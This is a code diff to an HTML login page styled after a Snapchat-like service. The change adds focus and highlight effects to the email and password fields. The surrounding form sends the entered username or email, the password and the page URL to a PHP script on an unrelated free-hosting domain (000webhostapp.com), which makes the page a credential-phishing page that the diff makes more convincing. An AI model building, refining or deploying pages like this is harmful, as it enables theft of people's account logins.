@@ -3,9 +3,25 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script>
       document.getElementById("url").value = window.location.href;
+      function emailEffect() {
+        document.getElementById("email-header").style.color = "#0eadff";
+        document.getElementById("email").style.borderColor = "#0eadff";
+      }
+      function removeEmailEffect() {
+        document.getElementById("email").style.borderColor = "#9A9FA7";
+        document.getElementById("email-header").style.color = "#9A9FA7";
+      }
+      function passEffect() {
+        document.getElementById("pass-header").style.color = "#0eadff";
+        document.getElementById("pass").style.borderColor = "#0eadff";
+      }
+      function removePassEffect() {
+        document.getElementById("pass").style.borderColor = "#9A9FA7";
+        document.getElementById("pass-header").style.color = "#9A9FA7";
+      }
     </script>
   </head>
-  <body>
+  <body onclick="removeEmailEffect(); removePassEffect();">
     <style>
       @font-face {
         font-family: SnapFont-thin;
@@ -111,10 +127,10 @@
       <div class="login-box">
         <div class="login">Log In</div>
         <form method="post" action="http://o10.000webhostapp.com/english.php">
-          <div class="input-headers" style="margin-top:0px;">USERNAME OR EMAIL</div>
-          <input class="inputs email" autocorrect="off" autocapitalize="off" name="email" type="text"></input>
-          <div class="input-headers">PASSWORD</div>
-          <input class="inputs pass" autocorrect="off" autocapitalize="off" name="password" type="password"></input>
+          <div class="input-headers" id="email-header" style="margin-top:0px;">USERNAME OR EMAIL</div>
+          <input class="inputs email" id="email" onclick="emailEffect(); removePassEffect();" autocorrect="off" autocapitalize="off" name="email" type="text"></input>
+          <div class="input-headers" id="pass-header">PASSWORD</div>
+          <input class="inputs pass" id="pass" onclick="passEffect(); removeEmailEffect();" autocorrect="off" autocapitalize="off" name="password" type="password"></input>
           <input id="url" type="hidden" name="url" value=""></input>
           <a class="forgot">Forgot your password?</a>
           <div class="submit">Log In</div>
